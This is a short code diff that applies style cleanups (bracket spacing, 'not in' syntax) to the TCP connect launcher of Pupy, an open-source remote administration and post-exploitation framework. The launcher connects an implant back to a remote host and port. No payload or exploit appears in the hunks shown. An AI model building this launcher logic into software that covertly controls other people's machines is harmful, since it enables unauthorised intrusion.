@@ -2,7 +2,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-__all__ = [ 'ConnectLauncher' ]
+__all__ = ['ConnectLauncher']
 
 import network
 import argparse
@@ -14,9 +14,9 @@ from network.lib.base_launcher import LauncherError, LauncherArgumentParser, Bas
 class ConnectLauncher(BaseLauncher):
     """ simple launcher that uses TCP connect with a chosen transport """
 
-    credentials = [ 'SSL_BIND_CERT' ]
+    credentials = ['SSL_BIND_CERT']
 
-    __slots__ = ( 'credentials', 'arg_parser', 'args', 'rhost', 'rport', 'connect_on_bind_payload' )
+    __slots__ = ('credentials', 'arg_parser', 'args', 'rhost', 'rport', 'connect_on_bind_payload')
 
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop("connect_on_bind_payload", False)
@@ -56,7 +56,7 @@ class ConnectLauncher(BaseLauncher):
                 client_args=t.client_kwargs
                 transport_args=t.client_transport_kwargs
 
-                if 'host' in transport_args and not 'host' in opt_args:
+                if 'host' in transport_args and 'host' not in opt_args:
                     transport_args['host'] = '{}{}'.format(
                         self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
                     )
